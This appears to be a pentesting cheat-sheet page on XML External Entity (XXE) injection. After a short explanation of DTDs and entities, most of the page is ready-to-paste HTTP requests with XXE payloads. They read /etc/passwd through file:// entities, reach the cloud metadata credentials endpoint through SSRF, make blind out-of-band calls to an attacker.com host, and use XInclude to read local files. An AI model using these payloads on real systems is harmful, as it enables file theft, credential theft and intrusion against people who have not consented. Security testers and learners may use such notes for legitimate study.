# 🔧 XML External Entity (XXE) Injection

## <mark style="color:red;">Intro</mark>

The XML document type definition (DTD) contains declarations that can define the structure of an XML document. The DTD is declared within the optional DOCTYPE element at the start of the XML document.

XXE are a type of custom XML entity whose defined values are loaded from outside of the DTD.

Allows an attacker to interfere with an application's processing of XML data.

#### <mark style="color:red;">**Examples**</mark>

* Custom entities to be defined within the DTD\
  `<!DOCTYPE foo [ <!ENTITY`` `<mark style="color:orange;">`myentity`</mark>` ``"`<mark style="color:yellow;">`my entity value`</mark>`" > ]>`&#x20;
* XML external entities\
  uses the "SYSTEM" keyword and must specify a URL\
  `<!DOCTYPE foo [ <!ENTITY`` `<mark style="color:orange;">`NAME`</mark>` ``SYSTEM "`<mark style="color:yellow;">`http://normal-website.com`</mark>`" > ]>`\
  `<!DOCTYPE foo [ <!ENTITY`` `<mark style="color:orange;">`NAME`</mark>` ``SYSTEM "`<mark style="color:yellow;">`file:///path/to/file`</mark>`" > ]>`&#x20;

## <mark style="color:red;">Types of XXE attacks</mark>

### <mark style="color:purple;">Exploiting XXE to retrieve files</mark>

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><MainTag><VulTag>&xxe;</VulTag></MainTag>
```

### <mark style="color:purple;">Exploiting XXE to perform SSRF attacks</mark>

```
// Edit HTTP request with "BurpSuit Proxy"

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY ssrf SYSTEM "http://169.254.169.254/admin/security-credentials"> ]><MainTag><VulTag>&ssrf;</VulTag></MainTag>
```

### <mark style="color:purple;">Blind XXE vulnerabilities</mark>

Does not return the values of any defined external entities within its responses.

```
// Edit HTTP request with "BurpSuit Proxy"
// Detecting: DNS lookup and HTTP request (with Burp Collaborator client)

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.attacker.com"> ]>]><MainTag><VulTag>&xxe;</VulTag></MainTag>
```

```
// Edit HTTP request with "BurpSuit Proxy"
// Detecting: DNS lookup and HTTP request (with Burp Collaborator client) + + XML parameter entity

POST /web/path HTTP/1.1
Host: test.net
...
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.attacker.com"> %xxe; ]> <MainTag><VulTag>&xxe;</VulTag></MainTag>
```

## <mark style="color:red;">Finding hidden attack surface for XXE injection</mark>

### <mark style="color:green;">XInclude attacks</mark>

Some applications receive client-submitted data, embed it on the server-side into an XML document like: backend SOAP service.

"XInclude" is a part of the XML specification that allows an XML document to be built from sub-documents.

```
// Edit HTTP request with "BurpSuit Proxy"
POST /product/stock HTTP/1.1
Host: web-security-academy.net
...
Connection: close

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> &storeId=1
```
